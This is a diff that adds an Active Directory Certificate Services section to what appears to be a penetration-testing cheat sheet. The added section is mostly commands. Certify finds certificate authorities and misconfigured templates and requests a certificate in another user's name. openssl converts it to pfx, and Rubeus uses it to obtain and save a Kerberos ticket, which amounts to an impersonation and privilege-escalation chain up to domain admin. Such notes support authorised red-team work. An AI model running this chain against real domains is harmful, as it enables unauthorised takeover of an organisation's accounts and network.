@@ -1211,6 +1211,44 @@ req query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Conn
   - https://github.com/AlsidOfficial/WSUSpendu 
 
 ## Active Directory Certificate Services
+- Whitepaper https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
+- https://github.com/GhostPack/Certify
+
+#### Find AD CS Certificate authorities (CA's)
+```
+.\Certify.exe cas
+```
+
+### Misconfigured Certificate Templates
+- AD CS certificate templates are provided by Microsoft as a starting point for distributing certificates.  They are designed to be duplicated and configured for specific needs.  Misconfigurations within these templates can be abused for privilege escalation.
+
+#### Find misconfigured certificate templates
+- Look for ```Client Authentication``` set and who has ```Enrollment Rights``` and if ```Authorization Signatures Required``` is enabled.
+- This configuration allows any domain user to request a certificate for any other domain user (including a domain admin), and use it to authenticate to the domain
+```
+.\Certify.exe find /vulnerable
+```
+
+#### Request certificate
+```
+.\Certify.exe request /ca:<CA NAME> /template:<TEMPLATE> /altname:<USERNAME>
+```
+
+#### Transform cert to pfx
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+
+#### Rubeus ask TGT using the certificate
+```
+cat cert.pfx | base64 -w 0
+.\Rubeus.exe asktgt /user:<USERNAME> /certificate:<BASE64 CERT> /password:password /aes256 /nowrap
+```
+
+#### Rubeus write TGT kirbi
+```
+[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
+```
 
 ## Cross Domain attacks
 ## Azure AD
